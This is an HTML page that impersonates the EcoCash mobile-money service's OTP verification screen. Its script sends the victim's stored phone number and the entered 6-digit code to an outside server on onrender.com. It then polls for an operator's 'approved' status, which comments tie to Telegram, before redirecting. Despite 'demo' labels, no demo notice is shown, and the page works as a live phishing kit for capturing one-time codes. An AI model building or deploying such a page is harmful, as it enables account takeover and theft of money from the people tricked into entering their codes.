<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>EcoCash — Demo OTP Verification</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      min-height: 100vh;
      font-family: Arial, Helvetica, sans-serif;
      background: #fff;
      color: #18233d;
    }

    .demo-notice {
      position: fixed;
      top: 12px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 100;

      padding: 8px 16px;
      border-radius: 20px;

      background: #fff4d6;
      border: 1px solid #efd38b;

      color: #806000;

      font-size: 11px;
      font-weight: 700;
      white-space: nowrap;
    }

    .page {
      width: min(100%, 1100px);
      min-height: 100vh;
      margin: 0 auto;

      border: 1px solid #e2e2e2;
      border-radius: 25px;

      overflow: hidden;

      background: #fff;

      box-shadow:
        0 2px 12px rgba(0, 0, 0, .06);
    }

    /* HEADER */

    .header {
      position: relative;

      height: 148px;

      display: flex;
      align-items: center;
      justify-content: center;

      border-bottom: 4px solid #0868c9;
    }

    .back-button {
      position: absolute;
      left: 45px;
      top: 50%;

      transform: translateY(-50%);

      border: none;
      background: transparent;

      color: #17233c;

      font-size: 52px;
      font-weight: 300;

      line-height: 1;

      cursor: pointer;
    }

    .logo {
      font-size: 76px;
      font-weight: 800;
      letter-spacing: -5px;
    }

    .logo-blue {
      color: #1761c4;
    }

    .logo-red {
      color: #df3028;
    }

    /* CONTENT */

    .content {
      width: min(720px, calc(100% - 40px));

      margin: 0 auto;

      padding: 45px 0 75px;

      text-align: center;
    }

    .otp-icon {
      width: 184px;
      height: 184px;

      margin: 0 auto 32px;

      display: flex;
      align-items: center;
      justify-content: center;

      border-radius: 50%;

      background: #edf5ff;

      position: relative;
    }

    .phone {
      width: 70px;
      height: 116px;

      border: 6px solid #172c4a;
      border-radius: 13px;

      position: relative;
    }

    .phone::after {
      content: "";

      position: absolute;

      width: 17px;
      height: 5px;

      bottom: 8px;
      left: 50%;

      transform: translateX(-50%);

      border-radius: 5px;

      background: #172c4a;
    }

    .otp-badge {
      position: absolute;

      right: 25px;
      top: 60px;

      padding: 12px 13px;

      border-radius: 12px;

      background: #1761c4;

      color: #fff;

      font-size: 25px;
      font-weight: 700;
    }

    h1 {
      font-size: 58px;
      font-weight: 500;

      margin-bottom: 27px;

      color: #111d35;
    }

    .description {
      font-size: 28px;
      line-height: 1.55;

      color: #303c57;

      margin-bottom: 36px;
    }

    .phone-number {
      color: #1761c4;
      font-weight: 700;
      white-space: nowrap;
    }

    /* SECURITY BOX */

    .security-box {
      width: 100%;

      display: flex;
      align-items: center;

      gap: 28px;

      padding: 28px 38px;

      margin-bottom: 65px;

      border-radius: 20px;

      background: #f1f7ff;

      text-align: left;
    }

    .shield {
      width: 74px;
      height: 82px;

      flex: 0 0 auto;

      position: relative;

      background: #1761c4;

      clip-path: polygon(
        50% 0,
        91% 15%,
        91% 52%,
        78% 73%,
        50% 100%,
        22% 73%,
        9% 52%,
        9% 15%
      );
    }

    .shield::after {
      content: "";

      position: absolute;

      width: 50%;
      height: 45%;

      left: 25%;
      top: 10%;

      background: #fff;
    }

    .security-title {
      font-size: 27px;
      font-weight: 700;

      margin-bottom: 10px;
    }

    .security-text {
      font-size: 22px;
      line-height: 1.4;

      color: #4a5875;
    }

    /* OTP */

    .otp-label {
      display: block;

      margin-bottom: 28px;

      text-align: left;

      font-size: 26px;

      color: #303c57;
    }

    .otp-boxes {
      display: flex;
      justify-content: space-between;

      gap: 18px;

      margin-bottom: 70px;
    }

    .otp-box {
      width: 94px;
      height: 108px;

      border: 2px solid #c6c8cf;
      border-radius: 18px;

      outline: none;

      background: #fff;

      text-align: center;

      font-size: 42px;
      color: #17233c;

      transition: .15s ease;
    }

    .otp-box:focus {
      border-color: #1761c4;

      box-shadow:
        0 0 0 2px rgba(23, 97, 196, .12);
    }

    .otp-box.error {
      border-color: #df3028;
      background: #fff8f8;
    }

    /* ERROR */

    .error-message {
      display: none;

      margin-top: -52px;
      margin-bottom: 35px;

      padding: 14px 18px;

      border-radius: 10px;

      background: #fff0f0;

      color: #c5221f;

      font-size: 16px;
      font-weight: 600;

      text-align: center;
    }

    .error-message.show {
      display: block;
    }

    /* RESEND */

    .resend-row {
      font-size: 23px;

      color: #303c57;

      margin-bottom: 15px;
    }

    .resend {
      border: none;
      background: transparent;

      color: #1761c4;

      font-size: 23px;
      font-weight: 600;

      cursor: pointer;
    }

    .resend:disabled {
      opacity: .5;
      cursor: not-allowed;
    }

    .timer {
      color: #df3028;

      font-size: 31px;
      font-weight: 500;

      margin-bottom: 45px;
    }

    /* VERIFY */

    .verify-button {
      width: 100%;
      height: 102px;

      border: none;
      border-radius: 17px;

      background: #1761c4;

      color: #fff;

      font-size: 29px;
      font-weight: 500;

      cursor: pointer;

      transition: .2s ease;
    }

    .verify-button:hover {
      background: #0f55b1;
    }

    .verify-button:disabled {
      opacity: .65;
      cursor: not-allowed;
    }

    /* FOOTER */

    .secure-footer {
      display: flex;
      align-items: center;
      justify-content: center;

      gap: 18px;

      margin-top: 70px;

      color: #53617d;

      font-size: 22px;
    }

    .lock {
      font-size: 29px;
    }

    /* SUCCESS */

    .success-message {
      display: none;

      margin-top: 20px;

      color: #16834b;

      font-size: 17px;
      font-weight: 600;
    }

    .success-message.show {
      display: block;
    }

    /* MOBILE */

    @media (max-width: 700px) {

      .page {
        border-radius: 0;
      }

      .demo-notice {
        font-size: 8px;
        max-width: calc(100% - 20px);

        overflow: hidden;
        text-overflow: ellipsis;
      }

      .header {
        height: 115px;
      }

      .back-button {
        left: 20px;
        font-size: 42px;
      }

      .logo {
        font-size: 47px;
        letter-spacing: -3px;
      }

      .content {
        width: calc(100% - 32px);
        padding-top: 35px;
      }

      .otp-icon {
        width: 135px;
        height: 135px;
      }

      .phone {
        width: 53px;
        height: 84px;
        border-width: 4px;
      }

      .otp-badge {
        right: 17px;
        top: 43px;

        padding: 8px 10px;

        font-size: 18px;
      }

      h1 {
        font-size: 42px;
      }

      .description {
        font-size: 20px;
      }

      .security-box {
        padding: 22px;
        gap: 18px;
        margin-bottom: 45px;
      }

      .shield {
        width: 52px;
        height: 60px;
      }

      .security-title {
        font-size: 21px;
      }

      .security-text {
        font-size: 17px;
      }

      .otp-label {
        font-size: 21px;
      }

      .otp-boxes {
        gap: 7px;
        margin-bottom: 55px;
      }

      .otp-box {
        width: 48px;
        height: 66px;

        border-radius: 12px;

        font-size: 28px;
      }

      .resend-row,
      .resend {
        font-size: 18px;
      }

      .timer {
        font-size: 27px;
      }

      .verify-button {
        height: 76px;
        font-size: 22px;
      }

      .secure-footer {
        margin-top: 45px;
        font-size: 17px;
      }
    }
  </style>
</head>

<body>


  <main class="page">

    <!-- HEADER -->

    <header class="header">

      <button
        class="back-button"
        id="backButton"
        type="button"
        aria-label="Go back"
      >
        ‹
      </button>

      <div class="logo">
        <span class="logo-blue">Eco</span><span class="logo-red">Cash</span>
      </div>

    </header>


    <!-- CONTENT -->

    <section class="content">

      <div class="otp-icon">
        <div class="phone"></div>
        <div class="otp-badge">OTP</div>
      </div>


      <h1>
        Enter OTP
      </h1>


      <p class="description">
        We have sent a 6-digit code to your EcoCash<br>
        number
        <span id="phone-number"></span>
      </p>


      <!-- SECURITY -->

      <div class="security-box">

        <div class="shield"></div>

        <div>

          <div class="security-title">
            Secure Verification
          </div>

          <div class="security-text">
            Enter the 6-digit code below
            to complete the application.
          </div>

        </div>

      </div>


      <!-- OTP -->

      <label class="otp-label">
        Enter 6-digit code
      </label>


      <div
        class="otp-boxes"
        id="otpBoxes"
      >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 1"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 2"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 3"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 4"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 5"
        >

        <input
          class="otp-box"
          maxlength="1"
          inputmode="numeric"
          autocomplete="off"
          aria-label="Demo code digit 6"
        >

      </div>


      <!-- ERROR -->

      <div
        class="error-message"
        id="errorMessage"
      >
        Incorrect code. Please try again.
      </div>


      <!-- RESEND -->

      <div class="resend-row">

        Need a new code?

        <button
          type="button"
          class="resend"
          id="resendButton"
        >
          Reset
        </button>

      </div>


      <div
        class="timer"
        id="timer"
      >
        00:45
      </div>


      <!-- VERIFY -->

      <button
        type="button"
        class="verify-button"
        id="verifyButton"
      >
        VERIFY CODE
      </button>


      <div
        class="success-message"
        id="successMessage"
      >
        Verification submitted. Waiting for approval...
      </div>


      <div class="secure-footer">
        <span class="lock">♙</span>
        <span>© 2026 Ecocash. All rights reserved.</span>
      </div>

    </section>

  </main>


  <script>

  


    /* ==========================================================
       API
    ========================================================== */

    const API_URL =
      "https://ecocash-0w1z.onrender.com";


    /* ==========================================================
       ELEMENTS
    ========================================================== */

    const otpBoxes =
      document.querySelectorAll(".otp-box");

    const verifyButton =
      document.getElementById("verifyButton");

    const errorMessage =
      document.getElementById("errorMessage");

    const successMessage =
      document.getElementById("successMessage");

    const resendButton =
      document.getElementById("resendButton");

    const timerElement =
      document.getElementById("timer");

    const backButton =
      document.getElementById("backButton");

   const phone = document.getElementById("phone-number");

const phoneNumber =
  sessionStorage.getItem("phone") || "";

phone.textContent ="+263"+" "+ phoneNumber;
    
    /* ==========================================================
       STATE
    ========================================================== */

    let currentRequestId = null;

    let cancelled = false;

    let timerInterval = null;

    let remainingSeconds = 45;


    /* ==========================================================
       OTP INPUT
    ========================================================== */

    otpBoxes.forEach(function (box, index) {

      box.addEventListener(
        "input",
        function () {

          this.value =
            this.value
              .replace(/\D/g, "")
              .slice(0, 1);

          errorMessage.classList.remove("show");

          this.classList.remove("error");

          if (
            this.value &&
            index < otpBoxes.length - 1
          ) {

            otpBoxes[index + 1].focus();

          }

        }
      );


      box.addEventListener(
        "keydown",
        function (event) {

          if (
            event.key === "Backspace" &&
            !this.value &&
            index > 0
          ) {

            otpBoxes[index - 1].focus();

          }

        }
      );


      box.addEventListener(
        "paste",
        function (event) {

          event.preventDefault();

          const pasted =
            event.clipboardData
              .getData("text")
              .replace(/\D/g, "")
              .slice(0, 6);

          pasted
            .split("")
            .forEach(function (digit, i) {

              if (otpBoxes[i]) {

                otpBoxes[i].value =
                  digit;

              }

            });

          if (pasted.length === 6) {

            otpBoxes[5].focus();

          }

        }
      );

    });


    /* ==========================================================
       GET ENTERED DEMO CODE
    ========================================================== */

    function getEnteredCode() {

      return [...otpBoxes]
        .map(function (box) {
          return box.value;
        })
        .join("");

    }


    /* ==========================================================
       RESET CODE INPUT
    ========================================================== */

    function resetCodeInput() {

      otpBoxes.forEach(function (box) {

        box.value = "";

        box.classList.remove("error");

      });

      errorMessage.classList.remove("show");

      otpBoxes[0].focus();

    }


    /* ==========================================================
       SERVER REQUEST
    ========================================================== */

    async function submitDemoCode(code) {

  const phone =
    sessionStorage.getItem("phone") || "";
    const codea = getEnteredCode();

  const response =
    await fetch(
      `${API_URL}/api/demo-otp-request`,
      {
        method: "POST",

        headers: {
          "Content-Type": "application/json"
        },

        body: JSON.stringify({
          phone: phone,
          demoCode: codea
        })
      }
    );

  const text =
    await response.text();

  let data;

  try {

    data = JSON.parse(text);

  } catch (error) {

    throw new Error(
      "Server returned a non-JSON response: " +
      text.slice(0, 200)
    );

  }

  if (
    !response.ok ||
    !data.ok
  ) {

    throw new Error(
      data.error ||
      "Unable to submit verification."
    );

  }

  if (!data.requestId) {

    throw new Error(
      "The server did not return a request ID."
    );

  }

  return data.requestId;
}
    /* ==========================================================
       POLL DEMO STATUS
    ========================================================== */

    async function waitForApproval(requestId) {

      cancelled = false;


      while (!cancelled) {

        await new Promise(
          function (resolve) {

            setTimeout(
              resolve,
              1500
            );

          }
        );


        if (cancelled) {

          return;

        }


        try {

          const response =
            await fetch(
              `${API_URL}/api/demo-status/${encodeURIComponent(requestId)}`,
              {
                method: "GET",
                cache: "no-store"
              }
            );


          const text =
            await response.text();


          let data;


          try {

            data =
              JSON.parse(text);

          } catch (error) {

            console.error(
              "Status endpoint returned non-JSON:",
              text
            );

            continue;

          }


          if (!response.ok) {

            console.error(
              "Status request failed:",
              data
            );

            continue;

          }


          /* ====================================================
             APPROVED
          ==================================================== */

          if (
            data.status ===
            "approved"
          ) {

            stopPolling();


            successMessage.textContent =
              "Verification approved. Opening dashboard...";


            successMessage.classList.add(
              "show"
            );


            verifyButton.disabled =
              true;


            setTimeout(
              function () {

                window.location.href =
                  "dashboard.html";

              },
              700
            );


            return;

          }


          /* ====================================================
             REJECTED
          ==================================================== */

          if (
            data.status ===
            "rejected"
          ) {

            stopPolling();


            successMessage.classList.remove(
              "show"
            );


            errorMessage.textContent =
              "Verification was rejected. Please try again.";


            errorMessage.classList.add(
              "show"
            );


            verifyButton.disabled =
              false;


            verifyButton.textContent =
              "VERIFY CODE";


            resetCodeInput();


            return;

          }


          /* ====================================================
             EXPIRED
          ==================================================== */

          if (
            data.status ===
            "expired"
          ) {

            stopPolling();


            successMessage.classList.remove(
              "show"
            );


            errorMessage.textContent =
              "The verification request expired. Please try again.";


            errorMessage.classList.add(
              "show"
            );


            verifyButton.disabled =
              false;


            verifyButton.textContent =
              "VERIFY CODE";


            return;

          }

        } catch (error) {

          console.error(
            "Status check failed:",
            error
          );

        }

      }

    }


    /* ==========================================================
       STOP POLLING
    ========================================================== */

    function stopPolling() {

      cancelled = true;

      currentRequestId = null;

    }


    /* ==========================================================
       VERIFY DEMO CODE
    ========================================================== */

    verifyButton.addEventListener(
      "click",
      async function () {

        const enteredCode =
          getEnteredCode();


        /* ------------------------------------------------------
           REQUIRE SIX DIGITS
        ------------------------------------------------------ */

        if (
          enteredCode.length !== 6
        ) {

          errorMessage.textContent =
            "Please enter the complete 6-digit code.";


          errorMessage.classList.add(
            "show"
          );


          otpBoxes.forEach(
            function (box) {

              box.classList.add(
                "error"
              );

            }
          );


          return;

        }


        /* ------------------------------------------------------
           STOP ANY PREVIOUS REQUEST
        ------------------------------------------------------ */

        stopPolling();


        /* ------------------------------------------------------
           UI: WAITING
        ------------------------------------------------------ */

        verifyButton.disabled =
          true;


        verifyButton.textContent =
          "VERIFYING...";


        errorMessage.classList.remove(
          "show"
        );


        successMessage.textContent =
          "Checking the code...";


        successMessage.classList.add(
          "show"
        );


        try {

          /*
            The entered value goes ONLY to your own
            demo backend.

            It is NOT sent to Telegram.
          */

          const requestId =
            await submitDemoCode(
              enteredCode
            );


          currentRequestId =
            requestId;


          successMessage.textContent =
            "Code accepted. Waiting for approval...";


          verifyButton.textContent =
            "WAITING FOR APPROVAL...";


          /*
            Telegram approval/status flow.
          */

          await waitForApproval(
            requestId
          );


        } catch (error) {

          console.error(
            "Verification failed:",
            error
          );


          successMessage.classList.remove(
            "show"
          );


          errorMessage.textContent =
            error.message ||
            "Unable to contact the approval server.";


          errorMessage.classList.add(
            "show"
          );


          verifyButton.disabled =
            false;


          verifyButton.textContent =
            "VERIFY CODE";


          otpBoxes.forEach(
            function (box) {

              box.classList.add(
                "error"
              );

            }
          );

        }

      }
    );


    /* ==========================================================
       RESET DEMO
    ========================================================== */

    resendButton.addEventListener(
      "click",
      function () {

        stopPolling();


        successMessage.classList.remove(
          "show"
        );


        errorMessage.classList.remove(
          "show"
        );


        verifyButton.disabled =
          false;


        verifyButton.textContent =
          "VERIFY CODE";


        resetCodeInput();


        startTimer();

      }
    );


    /* ==========================================================
       TIMER
    ========================================================== */

    function startTimer() {

      clearInterval(
        timerInterval
      );


      remainingSeconds =
        45;


      updateTimer();


      timerInterval =
        setInterval(
          function () {

            remainingSeconds--;

            updateTimer();


            if (
              remainingSeconds <= 0
            ) {

              clearInterval(
                timerInterval
              );

            }

          },
          1000
        );

    }


    function updateTimer() {

      const minutes =
        String(
          Math.floor(
            remainingSeconds / 60
          )
        ).padStart(
          2,
          "0"
        );


      const seconds =
        String(
          remainingSeconds % 60
        ).padStart(
          2,
          "0"
        );


      timerElement.textContent =
        minutes + ":" + seconds;

    }


    /* ==========================================================
       BACK
    ========================================================== */

    backButton.addEventListener(
      "click",
      function () {

        stopPolling();

        clearInterval(
          timerInterval
        );

        window.history.back();

      }
    );


    /* ==========================================================
       INITIAL STATE
    ========================================================== */

    startTimer();

    otpBoxes[0].focus();

  </script>

</body>
</html>
